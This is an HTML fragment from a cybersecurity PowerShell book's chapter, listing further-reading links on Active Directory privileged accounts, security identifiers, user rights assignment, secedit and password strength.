			<p><strong class="bold">Privileged accounts </strong><span class="No-Break"><strong class="bold">and groups</strong></span><span class="No-Break">:</span></p>
			<ul>
				<li>Appendix B: Privileged Accounts and Groups in Active <span class="No-Break">Directory: </span><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory"><span class="No-Break">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory</span></a><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn487460(v=ws.11)&#13;"/></li>
			</ul>
			<p><span class="No-Break"><strong class="bold">Security Identifiers</strong></span><span class="No-Break">:</span></p>
			<ul>
				<li>Well-known security identifiers in Windows operating <span class="No-Break">systems: </span><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers"><span class="No-Break">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers</span></a><a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows&#13;"/></li>
				<li>Well-known <span class="No-Break">SIDs: </span><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids"><span class="No-Break">https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids</span></a><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids&#13;"/></li>
			</ul>
			<p><strong class="bold">User </strong><span class="No-Break"><strong class="bold">rights assignment</strong></span><span class="No-Break">:</span></p>
			<ul>
				<li>User Rights <span class="No-Break">Assignment: </span><a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment"><span class="No-Break">https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment</span></a><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment&#13;"/></li>
				<li><span class="No-Break">Secedit: </span><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-xp/bb490997(v=technet.10)&#13;"><span class="No-Break">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-xp/bb490997(v=technet.10)</span></a></li>
			</ul>
			<p><strong class="bold">xkcd </strong><span class="No-Break"><strong class="bold">password strength</strong></span><span class="No-Break">:</span></p>
			<ul>
				<li>Password <span class="No-Break">strength: </span><a href="https://xkcd.com/936/"><span class="No-Break">https://xkcd.com/936/</span></a><a href="https://xkcd.com/936/&#13;"/></li>
			</ul>
			<p>You can also find all links mentioned in this chapter in the GitHub repository for <a href="B16679_06_Final_PD.xhtml#_idTextAnchor150"><span class="No-Break"><em class="italic">Chapter 6</em></span></a> – no need to manually type in every <span class="No-Break">link: </span><a href="https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter06/Links.md"><span class="No-Break">https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter06/Links.md</span></a><span class="No-Break">.</span></p>
		</div>
	</body></html>